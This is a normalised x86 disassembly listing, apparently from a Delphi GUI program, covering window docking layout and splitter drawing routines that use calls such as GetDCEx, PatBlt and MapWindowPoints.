call sub_47ddb0
pop ecx
jmp r-xdata
pop ebx
pop ecx
pop ecx
pop ebp
retn 0x4
sub_47df60
push ebp
mov ebp esp
add esp 0xffffffe4
push ebx
push esi
push edi
mov ebx edx
mov esi eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_44d060
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_47e084
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx [ esi + 0x14 ]
mov eax [ ebp - 0x4 ]
call sub_46f4f8
mov eax [ ebp - 0x4 ]
call sub_44cf34
xor eax eax
push ebp
push sub_47e067
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_44dfac
xor eax eax
push ebp
push sub_47e04a
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ esi + 0x14 ]
call sub_475884
dec eax
test eax eax
jl r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_47e051
xor edx edx
mov eax [ ebp - 0x4 ]
call sub_44dfac
retn
inc eax
mov [ ebp - 0xc ] eax
mov [ ebp - 0x8 ] 0x0
inc [ ebp - 0x8 ]
dec [ ebp - 0xc ]
jne r-xdata
mov eax [ ebx + 0x90 ]
cmp eax [ esi + 0x14 ]
jne r-xdata
mov eax [ esi + 0x14 ]
mov edx [ ebp - 0x8 ]
call sub_475848
mov ebx eax
cmp [ ebx + 0x59 ] 0x0
je r-xdata
lea edx [ ebp - 0x1c ]
mov eax ebx
call sub_4706f0
lea ecx [ ebp - 0x1c ]
mov edx ebx
mov eax esi
mov edi [ eax ]
call [ edi ]
lea ecx [ ebp - 0x1c ]
mov edx ebx
mov eax esi
mov edi [ eax ]
call [ edi + 0x4 ]
lea eax [ ebp - 0x1c ]
push eax
mov ecx ebx
mov edx [ ebp - 0x4 ]
mov eax esi
mov ebx [ eax ]
call [ ebx + 0x20 ]
sub_47e094
push ebp
mov ebp esp
add esp 0xffffffe4
push ebx
push esi
push edi
mov ebx ecx
mov esi eax
mov eax [ esi + 0x14 ]
call sub_4784d0
mov edi eax
test ebx ebx
je r-xdata
mov eax [ esi + 0x14 ]
call sub_47078c
push eax
lea eax [ ebp - 0x1c ]
push eax
mov eax [ esi + 0x14 ]
call sub_47074c
mov ecx eax
xor edx edx
xor eax eax
call sub_40ab90
mov eax [ ebp + 0x8 ]
push esi
push edi
lea esi [ ebp - 0x1c ]
mov edi eax
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
pop edi
pop esi
test edi edi
jle r-xdata
cmp [ ebx + 0x8c ] 0x0
je r-xdata
push 0x2
mov eax [ ebp + 0x8 ]
push eax
push 0x0
mov eax [ esi + 0x14 ]
call sub_479ce0
push eax
call MapWindowPoints
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x8
movzx eax [ ebp + 0xc ]
dec al
je r-xdata
cmp edi 0x2
jge r-xdata
mov eax [ ebp + 0x8 ]
mov ecx 0x2
add eax 0xc
push eax
mov eax [ eax ]
cdq
idiv ecx
pop edx
mov [ edx ] eax
jmp r-xdata
dec al
je r-xdata
mov eax [ ebx + 0x40 ]
mov [ ebp - 0x4 ] eax
mov eax [ ebx + 0x44 ]
mov [ ebp - 0x8 ] eax
mov eax [ ebx + 0x48 ]
mov edi eax
mov edx [ ebx + 0x4c ]
mov [ ebp - 0xc ] edx
movzx edx [ ebp + 0xc ]
add dl 0xfd
sub dl 0x2
jae r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax + 0xc ]
sar eax 0x1
jns r-xdata
dec al
je r-xdata
movzx eax [ ebp + 0xc ]
dec eax
sub al 0x2
jae r-xdata
mov edi eax
sar edi 0x1
jns r-xdata
mov edx [ ebp + 0x8 ]
mov [ edx + 0x4 ] eax
jmp r-xdata
adc eax 0x0
mov eax [ ebp + 0x8 ]
mov ecx 0x2
add eax 0x8
push eax
mov eax [ eax ]
cdq
idiv ecx
pop edx
mov [ edx ] eax
jmp r-xdata
dec al
je r-xdata
movzx eax [ ebp + 0xc ]
sub al 0x2
je r-xdata
mov eax [ ebx + 0x4c ]
sar eax 0x1
jns r-xdata
adc edi 0x0
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax + 0x8 ]
sar eax 0x1
jns r-xdata
jmp r-xdata
mov eax [ ebp - 0xc ]
add [ ebp - 0x8 ] eax
sub al 0x2
jne r-xdata
mov [ ebp - 0xc ] eax
adc eax 0x0
mov edx [ ebp + 0x8 ]
mov [ edx ] eax
jmp r-xdata
adc eax 0x0
mov eax [ ebp - 0xc ]
push eax
lea eax [ ebp - 0x1c ]
push eax
mov ecx edi
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
call sub_40ac8c
mov eax [ ebp + 0x8 ]
push esi
lea esi [ ebp - 0x1c ]
mov edi eax
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
pop esi
add [ ebp - 0x4 ] edi
jmp r-xdata
sub_47e210
push ebp
mov ebp esp
push ebx
mov ebx eax
mov eax [ ebx + 0xc ]
test eax eax
je r-xdata
mov eax [ ebx + 0x8 ]
test eax eax
je r-xdata
mov edx [ ebp + 0x8 ]
push edx
call sub_47e210
pop ecx
mov eax ebx
call sub_4055f0
pop ebx
pop ebp
retn
mov edx [ ebp + 0x8 ]
push edx
call sub_47e210
pop ecx
sub_47e244
push ebp
mov ebp esp
push ebx
push esi
mov ebx edx
mov esi eax
test ebx ebx
je r-xdata
pop esi
pop ebx
pop ebp
retn
mov eax [ ebx + 0x8 ]
test eax eax
je r-xdata
mov eax [ ebx + 0x18 ]
test eax eax
je r-xdata
push ebp
call sub_47e210
pop ecx
mov eax [ ebx + 0x14 ]
test eax eax
je r-xdata
mov edx [ ebx + 0xc ]
mov [ eax + 0xc ] edx
jmp r-xdata
mov eax [ ebx + 0xc ]
test eax eax
je r-xdata
mov edx [ ebx + 0xc ]
mov [ eax + 0x8 ] edx
cmp ebx [ esi + 0x64 ]
jne r-xdata
mov edx [ ebx + 0x18 ]
mov [ eax + 0x18 ] edx
mov eax ebx
call sub_4055f0
xor eax eax
mov [ esi + 0x64 ] eax
sub_47e2a0
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
call sub_47d018
test eax eax
je r-xdata
pop esi
pop ebx
retn
cmp eax [ ebx + 0x38 ]
jne r-xdata
mov edx eax
mov eax ebx
call sub_47e2e0
xor edx edx
mov [ eax + 0x4 ] edx
jmp r-xdata
mov [ esi + 0x8c ] 0x0
mov eax [ ebx + 0x14 ]
mov edx [ eax ]
call [ edx + 0x90 ]
sub_47e2e0
push ebp
mov ebp esp
xor ecx ecx
push ecx
push ecx
push ecx
push ecx
push ecx
push ebx
push esi
push edi
mov ebx edx
mov esi eax
xor eax eax
push ebp
push sub_47e572
push [ fs : eax ]
mov [ fs : eax ] esp
test ebx ebx
jne r-xdata
cmp [ ebx + 0x4 ] 0x0
jne r-xdata
lea edx [ ebp - 0x8 ]
mov eax [ rw-data ]
call sub_40a204
lea eax [ ebp - 0x8 ]
push eax
lea edx [ ebp - 0xc ]
mov eax [ rw-data ]
call sub_40a204
mov edx [ ebp - 0xc ]
pop eax
call sub_4074a4
mov ecx [ ebp - 0x8 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_4160ac
call sub_4060b0
mov eax [ ebx + 0x14 ]
call sub_47c768
cmp eax 0x1
jne r-xdata
lea edx [ ebp - 0x10 ]
mov eax [ rw-data ]
call sub_40a204
lea eax [ ebp - 0x10 ]
push eax
lea edx [ ebp - 0x14 ]
mov eax [ rw-data ]
call sub_40a204
mov edx [ ebp - 0x14 ]
pop eax
call sub_4074a4
mov ecx [ ebp - 0x10 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_4160ac
call sub_4060b0
cmp eax 0x2
jne r-xdata
mov eax [ esi + 0x64 ]
xor edx edx
mov [ eax + 0x8 ] edx
mov [ eax + 0x10 ] 0x0
jmp r-xdata
mov eax [ ebx + 0x18 ]
test eax eax
jne r-xdata
mov eax [ ebx + 0x18 ]
test eax eax
jne r-xdata
mov eax ebx
call sub_4055f0
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_47e579
lea eax [ ebp - 0x14 ]
mov edx 0x4
call j_sub_4068c4
retn
mov edx [ ebx + 0xc ]
mov [ eax + 0xc ] edx
mov edx [ ebx + 0xc ]
test edx edx
je r-xdata
mov eax [ ebx + 0x14 ]
mov edx [ ebx + 0xc ]
mov [ eax + 0x8 ] edx
mov eax [ ebx + 0xc ]
xor edx edx
mov [ eax + 0x18 ] edx
call sub_47cb48
jmp r-xdata
mov edi eax
mov edi [ ebx + 0xc ]
jmp r-xdata
mov eax ebx
call sub_47ccc4
mov edx eax
mov eax [ ebx + 0x18 ]
call sub_47cd00
mov eax [ ebx + 0x18 ]
call sub_47cb48
mov [ edx + 0x18 ] eax
push esi
push sub_47ec54
mov edx [ ebx + 0x14 ]
mov eax esi
call sub_47d080
mov eax [ ebx + 0x14 ]
cmp eax [ esi + 0x64 ]
jne r-xdata
mov edx [ esi + 0x64 ]
mov eax [ ebx + 0x14 ]
cmp edx eax
jne r-xdata
cmp [ edi + 0x4 ] 0x0
je r-xdata
mov eax [ edi + 0x8 ]
test eax eax
je r-xdata
mov edx [ esi + 0x68 ]
mov eax edi
call sub_47cd00
mov eax [ esi + 0x64 ]
call sub_47ccc4
mov [ esi + 0x68 ] eax
mov eax [ esi + 0x64 ]
call sub_4055f0
mov [ esi + 0x64 ] edi
xor eax eax
mov [ edi + 0xc ] eax
xor eax eax
mov [ edi + 0x18 ] eax
xor eax eax
mov [ edi + 0x14 ] eax
mov eax esi
call sub_47ec2c
jmp r-xdata
mov [ eax + 0x10 ] 0x0
mov edx [ edi + 0x4 ]
mov [ eax + 0x4 ] edx
xor edx edx
mov [ eax + 0x8 ] edx
mov eax edi
call sub_4055f0
mov eax [ esi + 0x64 ]
mov [ eax + 0x8 ] edi
xor eax eax
mov [ edi + 0x18 ] eax
xor eax eax
mov [ edi + 0xc ] eax
mov [ ebp - 0x4 ] edi
mov eax [ esi + 0x64 ]
call sub_47c820
mov edx [ ebp - 0x4 ]
mov [ edx + 0x20 ] eax
mov eax edi
call sub_47cb48
jmp r-xdata
mov eax [ edi + 0x14 ]
xor edx edx
mov [ eax + 0x8 ] edx
mov eax edi
call sub_4055f0
jmp r-xdata
mov edx [ ebx + 0x14 ]
mov edx [ edx + 0x18 ]
mov [ eax + 0x18 ] edx
mov edx [ edi + 0x8 ]
cmp [ edx + 0x18 ] 0x0
jne r-xdata
push esi
push sub_47ec54
mov edx [ ebx + 0x14 ]
mov eax esi
call sub_47d080
jmp r-xdata
mov edx [ edi + 0x8 ]
mov edx [ edx + 0x18 ]
mov [ edx + 0xc ] eax
mov edx [ ebx + 0x14 ]
mov edx [ edx + 0x14 ]
mov [ edx + 0x8 ] eax
jmp r-xdata
mov edx [ ebx + 0x14 ]
mov edx [ edx + 0xc ]
mov [ eax + 0xc ] edx
cmp [ eax + 0xc ] 0x0
je r-xdata
mov eax [ eax + 0xc ]
mov edx [ ebx + 0x14 ]
mov edx [ edx + 0x14 ]
mov [ eax + 0x14 ] edx
cmp [ eax + 0xc ] 0x0
jne r-xdata
mov eax [ edi + 0x8 ]
mov edx [ ebx + 0x14 ]
mov edx [ edx + 0x14 ]
mov [ eax + 0x14 ] edx
cmp [ eax + 0xc ] 0x0
je r-xdata
push esi
push sub_47ec54
mov edx [ eax + 0x14 ]
mov eax esi
call sub_47d080
mov eax [ ebx + 0x14 ]
call sub_4055f0
mov eax edi
call sub_4055f0
jmp r-xdata
mov edx [ eax + 0xc ]
mov [ edx + 0x18 ] eax
sub_47e580
push ebx
push esi
push edi
add esp 0xfffffff0
mov ebx edx
mov edi eax
mov esi [ edi + 0x14 ]
test [ esi + 0x1c ] 0x1
jne r-xdata
add esp 0x10
pop edi
pop esi
pop ebx
retn
cmp [ edi + 0x38 ] 0x0
jne r-xdata
cmp [ edi + 0x64 ] 0x0
je r-xdata
mov eax esi
call sub_4784d0
test eax eax
jle r-xdata
mov edx esp
mov eax [ edi + 0x14 ]
mov ecx [ eax ]
call [ ecx + 0x54 ]
mov edx esp
mov eax [ edi + 0x14 ]
mov ecx [ eax ]
call [ ecx + 0xa0 ]
test bl bl
jne r-xdata
push edi
lea esi [ esp + 0x4 ]
add edi 0x20
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
pop edi
mov eax [ edi + 0x64 ]
movzx edx [ eax + 0x10 ]
dec dl
je r-xdata
lea edx [ edi + 0x20 ]
mov eax esp
call sub_40ab6c
test al al
jne r-xdata
mov edx [ esp + 0x8 ]
sub edx [ esp ]
mov [ eax + 0x20 ] edx
mov eax [ esp + 0xc ]
sub eax [ esp + 0x4 ]
mov [ edi + 0x68 ] eax
jmp r-xdata
dec dl
je r-xdata
mov eax [ edi + 0x14 ]
call sub_47843c
test eax eax
jle r-xdata
mov edx [ esp + 0xc ]
sub edx [ esp + 0x4 ]
mov [ eax + 0x20 ] edx
mov eax [ esp + 0x8 ]
sub eax [ esp ]
mov [ edi + 0x68 ] eax
jmp r-xdata
xor edx edx
mov eax edi
call sub_47eadc
cmp [ edi + 0x6c ] 0x0
jne r-xdata
push edi
push sub_47ec54
xor edx edx
mov eax edi
call sub_47d080
sub_47e660
push ebx
push esi
push edi
push ecx
mov ebx edx
mov esi eax
test ebx ebx
je r-xdata
pop edx
pop edi
pop esi
pop ebx
retn
test ebx ebx
je r-xdata
mov eax [ ebx + 0x14 ]
movzx eax [ eax + 0x10 ]
cmp al [ esi + 0x48 ]
jne r-xdata
mov edi ebx
mov eax ebx
call sub_47ccc4
mov [ esp ] eax
fild [ esp ]
fmul [ esi + 0x40 ]
call sub_404638
mov [ edi + 0x20 ] eax
sub_47e6d0
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
xor edx edx
mov [ ebp - 0x4 ] edx
mov ebx eax
xor eax eax
push ebp
push sub_47e74c
push [ fs : eax ]
mov [ fs : eax ] esp
call sub_4199d0
lea ecx [ ebp - 0x4 ]
mov edx ebx
call sub_419308
mov eax [ ebp - 0x4 ]
call sub_408754
mov [ ebp - 0x8 ] eax
lea edx [ ebp - 0x8 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov ecx 0x4
mov ebx [ eax ]
call [ ebx + 0x10 ]
cmp [ ebp - 0x8 ] 0x0
jle r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_47e753
lea eax [ ebp - 0x4 ]
mov edx [ r-xdata ]
call sub_408928
retn
mov edx [ ebp - 0x4 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov ecx [ ebp - 0x8 ]
mov ebx [ eax ]
call [ ebx + 0x10 ]
sub_47e758
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
push esi
xor ecx ecx
mov [ ebp - 0x10 ] ecx
mov [ ebp - 0x4 ] edx
mov ebx eax
xor eax eax
push ebp
push sub_47e85f
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
cmp ebx [ eax + 0x64 ]
je r-xdata
lea edx [ ebp - 0x4 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov ecx 0x4
mov esi [ eax ]
call [ esi + 0x10 ]
movzx eax [ ebx + 0x10 ]
mov [ ebp - 0xc ] eax
lea edx [ ebp - 0xc ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov ecx 0x1
mov esi [ eax ]
call [ esi + 0x10 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
cmp [ eax + 0x74 ] 0x0
je r-xdata
cmp [ ebx + 0x8 ] 0x0
jne r-xdata
mov eax [ ebx + 0x20 ]
mov [ ebp - 0x8 ] eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
movzx edx [ ebx + 0x10 ]
mov ecx [ eax ]
call [ ecx + 0x28 ]
mov ecx eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov edx [ ebx + 0x20 ]
call sub_47f3c8
mov [ ebp - 0x8 ] eax
jmp r-xdata
cmp [ ebx + 0x4 ] 0x0
je r-xdata
mov eax [ ebx + 0xc ]
test eax eax
je r-xdata
mov edx [ ebp + 0x8 ]
push edx
mov edx [ ebp - 0x4 ]
inc edx
call sub_47e758
pop ecx
lea edx [ ebp - 0x8 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov ecx 0x4
mov esi [ eax ]
call [ esi + 0x10 ]
mov eax [ ebp + 0x8 ]
push eax
lea edx [ ebp - 0x10 ]
mov eax ebx
call sub_47ca4c
mov eax [ ebp - 0x10 ]
call sub_47e6d0
pop ecx
mov eax [ ebx + 0x8 ]
test eax eax
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_47e866
lea eax [ ebp - 0x10 ]
call j_sub_4068a0
retn
mov edx [ ebp + 0x8 ]
push edx
mov edx [ ebp - 0x4 ]
call sub_47e758
pop ecx
sub_47e86c
push ebp
mov ebp esp
add esp 0xffffffe4
push ebx
push esi
xor ecx ecx
mov [ ebp - 0x1c ] ecx
mov [ ebp - 0xc ] ecx
mov [ ebp - 0x4 ] edx
mov [ ebp - 0x8 ] eax
xor eax eax
push ebp
push sub_47ea4e
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x8 ]
lea edx [ eax + 0x70 ]
mov ecx 0x4
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x10 ]
push 0x1
lea eax [ ebp - 0xc ]
mov ecx 0x1
mov edx [ r-xdata ]
call sub_40891c
add esp 0x4
mov eax [ ebp - 0x8 ]
movzx eax [ eax + 0x74 ]
mov edx [ ebp - 0xc ]
mov [ edx ] al
mov edx [ ebp - 0xc ]
mov ecx 0x1
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x10 ]
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x64 ]
movzx eax [ eax + 0x10 ]
mov edx [ ebp - 0xc ]
mov [ edx ] al
mov edx [ ebp - 0xc ]
mov ecx 0x1
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x10 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_433bc4
mov [ ebp - 0x18 ] eax
xor eax eax
push ebp
push sub_47e9b9
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x14 ]
call sub_47843c
mov ebx eax
dec ebx
test ebx ebx
jl r-xdata
mov eax [ ebp - 0x18 ]
mov edx [ eax ]
call [ edx + 0x14 ]
mov [ ebp - 0x14 ] eax
lea edx [ ebp - 0x14 ]
mov ecx 0x4
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x10 ]
mov ebx [ ebp - 0x14 ]
dec ebx
test ebx ebx
jl r-xdata
inc ebx
mov [ ebp - 0x10 ] 0x0
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_47e9c0
mov eax [ ebp - 0x18 ]
call sub_4055f0
retn
inc ebx
mov [ ebp - 0x10 ] 0x0
inc [ ebp - 0x10 ]
dec ebx
jne r-xdata
cmp [ esi + 0x8 ] 0x0
je r-xdata
push ebp
lea ecx [ ebp - 0x1c ]
mov edx [ ebp - 0x10 ]
mov eax [ ebp - 0x18 ]
mov esi [ eax ]
call [ esi + 0xc ]
mov eax [ ebp - 0x1c ]
call sub_47e6d0
pop ecx
inc [ ebp - 0x10 ]
dec ebx
jne r-xdata
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x14 ]
mov edx [ ebp - 0x10 ]
call sub_478450
mov esi eax
cmp [ esi + 0x59 ] 0x0
jne r-xdata
mov edx [ esi + 0x8 ]
mov eax [ ebp - 0x18 ]
mov ecx [ eax ]
call [ ecx + 0x38 ]
sub_47e9c0
mov eax [ ebp - 0x8 ]
cmp [ eax + 0x74 ] 0x0
je r-xdata
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x68 ]
mov [ ebp - 0x10 ] eax
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x64 ]
movzx edx [ eax + 0x10 ]
mov eax [ ebp - 0x8 ]
mov ecx [ eax ]
call [ ecx + 0x28 ]
mov ecx eax
mov eax [ ebp - 0x8 ]
mov edx [ eax + 0x68 ]
mov eax [ ebp - 0x8 ]
call sub_47f3c8
mov [ ebp - 0x10 ] eax
jmp r-xdata
lea edx [ ebp - 0x10 ]
mov ecx 0x4
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x10 ]
push ebp
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x64 ]
xor edx edx
call sub_47e758
pop ecx
mov edx rw-data
mov ecx 0x4
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x10 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_47ea55
lea eax [ ebp - 0x1c ]
call j_sub_4068a0
lea eax [ ebp - 0xc ]
mov edx [ r-xdata ]
call sub_408928
retn
sub_47ea5c
push ebp
mov ebp esp
push ebx
push esi
mov ebx eax
test ebx ebx
je r-xdata
pop esi
pop ebx
pop ebp
retn
mov eax ebx
call sub_47cd9c
test eax eax
jne r-xdata
mov eax [ ebp + 0x8 ]
push eax
mov eax ebx
call sub_47cdc4
call sub_47ea5c
pop ecx
mov eax [ ebp + 0x8 ]
push eax
mov eax ebx
call sub_47cd9c
call sub_47ea5c
pop ecx
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
cmp ebx [ eax + 0x64 ]
je r-xdata
mov eax ebx
call sub_47c7a0
test al al
je r-xdata
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x4 ]
mov edx [ edx + 0x64 ]
mov eax [ ebx + 0x14 ]
cmp edx eax
jne r-xdata
mov esi ebx
mov eax [ eax + 0x14 ]
call sub_47ccc4
mov [ esi + 0x20 ] eax
mov eax ebx
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x4 ]
mov edx [ edx + 0x68 ]
mov [ eax + 0x20 ] edx
jmp r-xdata
sub_47eadc
push ebp
mov ebp esp
push ecx
mov [ ebp - 0x4 ] eax
test edx edx
jne r-xdata
push ebp
mov eax edx
call sub_47ea5c
pop ecx
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x14 ]
mov edx [ eax ]
call [ edx + 0x90 ]
pop ecx
pop ebp
retn
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x64 ]
mov edx [ eax + 0x8 ]
sub_47eb24
push ebx
push esi
push edi
mov ebx edx
mov esi eax
test ebx ebx
je r-xdata
pop edi
pop esi
pop ebx
retn
cmp ebx [ esi + 0x64 ]
je r-xdata
mov eax [ ebx + 0x14 ]
movzx eax [ eax + 0x10 ]
cmp al [ esi + 0x48 ]
jne r-xdata
mov edi ebx
mov eax ebx
call sub_47ccc4
add eax [ esi + 0x4c ]
mov [ edi + 0x20 ] eax
sub_47eb54
push ebx
push esi
push edi
add esp 0xfffffff8
mov esi ecx
lea edi [ esp ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov ebx eax
mov [ ebx + 0x60 ] edx
mov eax [ ebx + 0x14 ]
call sub_479ce0
mov edx eax
mov eax [ rw-data ]
call sub_47f994
mov eax [ ebx + 0x14 ]
call sub_479ce0
mov esi eax
mov [ ebx + 0x5c ] esi
push 0x412
push 0x0
push esi
call GetDCEx
mov [ ebx + 0x58 ] eax
mov eax [ esp ]
mov [ ebx + 0x50 ] eax
mov eax [ esp + 0x4 ]
mov [ ebx + 0x54 ] eax
mov eax ebx
call sub_47ec78
pop ecx
pop edx
pop edi
pop esi
pop ebx
retn
sub_47ebb4
push ebx
mov ebx eax
xor edx edx
mov eax [ rw-data ]
call sub_47f994
mov eax ebx
call sub_47ec78
mov eax [ ebx + 0x58 ]
push eax
mov eax [ ebx + 0x5c ]
push eax
call ReleaseDC
mov eax [ ebx + 0x60 ]
mov edx [ eax + 0x14 ]
cmp [ edx + 0x10 ] 0x1
jne r-xdata
mov edx [ ebx + 0xc ]
sar edx 0x1
jns r-xdata
mov edx [ ebx + 0xc ]
sar edx 0x1
jns r-xdata
add edx [ ebx + 0x50 ]
mov [ eax + 0x20 ] edx
adc edx 0x0
add edx [ ebx + 0x54 ]
mov [ eax + 0x20 ] edx
jmp r-xdata
adc edx 0x0
mov eax [ ebx + 0x60 ]
mov edx [ eax + 0x14 ]
mov eax ebx
call sub_47eadc
push ebx
push sub_47ec54
mov eax [ ebx + 0x60 ]
mov edx [ eax + 0x14 ]
mov eax ebx
call sub_47d080
xor eax eax
mov [ ebx + 0x60 ] eax
pop ebx
retn
sub_47ec2c
push ebx
mov ebx eax
cmp [ ebx + 0x6c ] 0x0
jne r-xdata
pop ebx
retn
mov eax [ ebx + 0x14 ]
call sub_47843c
test eax eax
jle r-xdata
push ebx
push sub_47ec54
xor edx edx
mov eax ebx
call sub_47d080
sub_47ec78
push ebx
push esi
add esp 0xfffffff0
mov ebx eax
mov esi [ ebx + 0x60 ]
test esi esi
je r-xdata
add esp 0x10
pop esi
pop ebx
retn
mov eax [ esi + 0x14 ]
cmp [ eax + 0x10 ] 0x1
jne r-xdata
mov eax [ ebx + 0xc ]
sar eax 0x1
jns r-xdata
mov edx 0x2
mov eax esi
call sub_47c868
mov [ esp ] eax
mov eax [ ebx + 0xc ]
sar eax 0x1
jns r-xdata
mov edx [ ebx + 0x50 ]
sub edx eax
mov [ esp ] edx
mov edx 0x1
mov eax esi
call sub_47c868
mov [ esp + 0x4 ] eax
mov eax [ esp ]
add eax [ ebx + 0xc ]
mov [ esp + 0x8 ] eax
mov edx 0x1
mov eax [ ebx + 0x60 ]
call sub_47c8ec
add eax [ esp + 0x4 ]
mov [ esp + 0xc ] eax
adc eax 0x0
mov edx [ ebx + 0x54 ]
sub edx eax
mov [ esp + 0x4 ] edx
mov edx 0x2
mov eax [ ebx + 0x60 ]
call sub_47c8ec
add eax [ esp ]
mov [ esp + 0x8 ] eax
mov eax [ esp + 0x4 ]
add eax [ ebx + 0xc ]
mov [ esp + 0xc ] eax
jmp r-xdata
adc eax 0x0
mov eax [ ebx + 0x10 ]
call sub_44cd7c
push eax
mov eax [ ebx + 0x58 ]
push eax
call SelectObject
mov esi eax
push 0x5a0049
mov ecx [ esp + 0x10 ]
mov edx [ esp + 0x8 ]
sub ecx edx
push ecx
mov ecx [ esp + 0x10 ]
mov eax [ esp + 0x8 ]
sub ecx eax
push ecx
push edx
push eax
mov eax [ ebx + 0x58 ]
push eax
call PatBlt
push esi
mov eax [ ebx + 0x58 ]
push eax
call SelectObject
sub_47ed64
push ebp
mov ebp esp
push ebx
push esi
push edi
mov ebx eax
mov eax [ ebp + 0x8 ]
cmp ebx [ eax - 0x4 ]
je r-xdata
mov eax [ ebx + 0xc ]
test eax eax
je r-xdata
mov eax [ ebx + 0x14 ]
movzx eax [ eax + 0x10 ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x4 ]
mov edx [ edx + 0x14 ]
cmp al [ edx + 0x10 ]
jne r-xdata
mov eax [ ebx + 0x8 ]
test eax eax
je r-xdata
mov edx [ ebp + 0x8 ]
push edx
call sub_47ed64
pop ecx
mov eax ebx
call sub_47ccc4
mov edi eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
call sub_47ccc4
cmp edi eax
jle r-xdata
pop edi
pop esi
pop ebx
pop ebp
retn
mov edx [ ebp + 0x8 ]
push edx
call sub_47ed64
pop ecx
cmp [ ebx + 0x4 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
mov esi [ eax - 0x8 ]
mov eax ebx
call sub_47ccc4
cmp eax esi
jle r-xdata
mov esi [ ebx + 0x4 ]
test esi esi
je r-xdata
mov edx [ ebp + 0x8 ]
mov [ edx - 0x8 ] eax
mov eax esi
cmp [ esi + 0x59 ] 0x0
je r-xdata
sub_47edf4
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
mov [ ebp - 0x4 ] edx
mov ebx eax
mov eax [ ebp - 0x4 ]
mov esi [ eax + 0xc ]
test esi esi
je r-xdata
mov eax [ ebp - 0x4 ]
call sub_47ccc4
mov esi eax
mov eax [ ebp - 0x4 ]
call sub_47c820
add esi eax
mov [ ebp - 0x8 ] esi
mov eax esi
call sub_47ccc4
mov [ ebp - 0x8 ] eax
jmp r-xdata
push ebp
mov eax [ ebx + 0x64 ]
mov eax [ eax + 0x8 ]
call sub_47ed64
pop ecx
mov eax [ ebp - 0x8 ]
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_47ee44
push ebp
mov ebp esp
add esp 0xffffffe0
push ebx
push esi
push edi
mov esi edx
mov edi eax
mov bl 0x4
test esi esi
je r-xdata
mov eax ebx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
lea edx [ ebp - 0x10 ]
mov eax edi
call sub_4706f0
lea edx [ ebp - 0x20 ]
mov eax esi
call sub_4706f0
mov eax [ ebp - 0xc ]
cmp eax [ ebp - 0x1c ]
jg r-xdata
mov eax [ ebp - 0x10 ]
cmp eax [ ebp - 0x20 ]
jg r-xdata
mov eax [ ebp - 0x4 ]
cmp eax [ ebp - 0x14 ]
jge r-xdata
mov eax [ ebp - 0x1c ]
add eax [ ebp - 0x14 ]
sar eax 0x1
